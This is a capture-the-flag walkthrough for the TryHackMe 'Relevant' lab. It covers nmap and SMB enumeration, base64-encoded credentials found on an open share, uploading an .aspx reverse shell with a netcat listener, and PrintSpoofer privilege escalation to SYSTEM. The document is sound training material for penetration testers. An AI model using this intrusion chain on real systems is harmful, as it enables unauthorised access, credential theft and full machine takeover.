---
published: true
title: Relevant - TryHackMe Walkthrough
author: F3dai
category: Writeup
image: 'https://imgur.com/EbY8m0j.png'
---
Relevant - "Penetration Testing Challenge. You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in seven days.  "

**URL:** [Relevant](https://tryhackme.com/room/relevant)

**Difficulty:** Medium

**Author:** TheMayor

## Enumeration

We are given the IP 10.10.54.82. Add this to the /etc/hosts file. Let's scan the open ports with the following command:

<pre>sudo nmap -v -sV -sS -p- -T4 -sC -oN portscan relevant.thm</pre>

<pre>PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Windows Server 2016 Standard Evaluation 14393 netbios-ssn
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2020-08-22T17:23:55+00:00
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2020-07-24T23:16:08
|_Not valid after:  2021-01-23T23:16:08
|_ssl-date: 2020-08-22T17:24:34+00:00; +1s from scanner time.
49663/tcp open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC

Host script results:
|_clock-skew: mean: 1h24m02s, deviation: 3h07m52s, median: 1s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-08-22T10:23:58-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-08-22T17:23:56
|_  start_date: 2020-08-22T17:19:13</pre>

This is clearly a Windows box. Let's check out the webserver on port 49663:

![port 49663](https://imgur.com/i6p1QnT.png)

This is the default IIS page so let's move on.

Some of the nmap scripts revealed that smb was running on this machine, let's try and list any shares:

<pre>┌─[user@parrot]─[~/tryhackme/Relevant]
└──╼ $smbclient -L relevant.thm
Enter WORKGROUP\user's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	nt4wrksv        Disk      
SMB1 disabled -- no workgroup available</pre>

I managed to access the share "nt4srksv":

<pre>┌─[✗]─[user@parrot]─[~/tryhackme/Relevant]
└──╼ $smbclient  \\\\relevant.thm\\nt4wrksv
Enter WORKGROUP\user's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 25 22:46:04 2020
  ..                                  D        0  Sat Jul 25 22:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 16:15:33 2020</pre>

Transfer this file over to your local machine:

<pre>get passwords.txt</pre>

Take a look at the file:

**passwords.txt:**

<pre>[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk</pre>

Looks like it's base64 encoded. Let's decode this. I used CyberChef:

[CyberChef - gchq.github.io](https://gchq.github.io/CyberChef)

I got the following result:

<pre>Bob - !P*********23
Bill - Juw***************$$$</pre>

I tried these credentials for some of the services running but I got nothing. After some time, I re-scanned both web servers again with a larger wordlist:

<pre>gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://relevant.thm:49663</pre>

I got a hit on the following directory:

<pre>/nt4wrksv</pre>

This is the same directory that we saw on the share from earlier. Let's confirm by visiting passwords.txt:

<pre>┌─[user@parrot]─[~/tryhackme]
└──╼ $curl relevant.thm:49663/nt4wrksv/passwords.txt
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
</pre>

This means we can upload our own files to the server. However, php is disabled. Another webshell we can upload is .aspx and .asp.

I used this reverse shell:

![.aspx Reverse Shell - Github](https://github.com/borjmz/aspx-reverse-shell)

Add your IP and a port number to the file and upload it to the webserver via smbclient:

<pre>┌─[user@parrot]─[~/tryhackme/Relevant/webshells]
└──╼ $smbclient \\\\relevant.thm\\nt4wrksv
Enter WORKGROUP\user's password: 
Try "help" to get a list of possible commands.
smb: \> put shell.aspx
putting file shell.aspx as \shell.aspx (61.6 kb/s) (average 61.6 kb/s)
</pre>

Let's listen on port 4444:

<pre>nc -nvlp 4444</pre>

Visit the file path on the webserver:

<pre>relevant.thm:49663/nt4wrksv/shell.aspx</pre>

![reverse shell](https://imgur.com/CV8Ha6K.png)

The user flag can be found in Bob's home directory, without even being logged in as him.

I proceeded with some Windows enumeration - understanding groups and user permissions and I came across this:

<pre>c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
</pre>

The **SeImpersonatePrivilege** caught my eye.

Some research shows that this is exploitable for privilege escalation. 

The exploit must be for Windows 10 and more, we can identify more information about our system:

<pre>systeminfo</pre>

I found this article:

[PrintSpoofer - Github Pages](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)

*if you have SeAssignPrimaryToken or SeImpersonate privilege, you are SYSTEM*

*They allow you to run code or even create a new process in the context of another user*

Take a look at this GitHub repo:

[PrintSpoofer - Github](https://github.com/dievus/printspoofer)

Let's transfer this executable to our target with smbclient. Once it is there, locate the .exe in one of the web directories and execute it. 

<pre>cd C:\inetpub\wwwroot\nt4wrksv
PrintSpoofer.exe -i -c cmd</pre>

And we have elevated our privileges:

<pre>C:\Windows\system32>whoami
whoami
nt authority\system</pre>

![root](https://imgur.com/Me9RYdG.png)



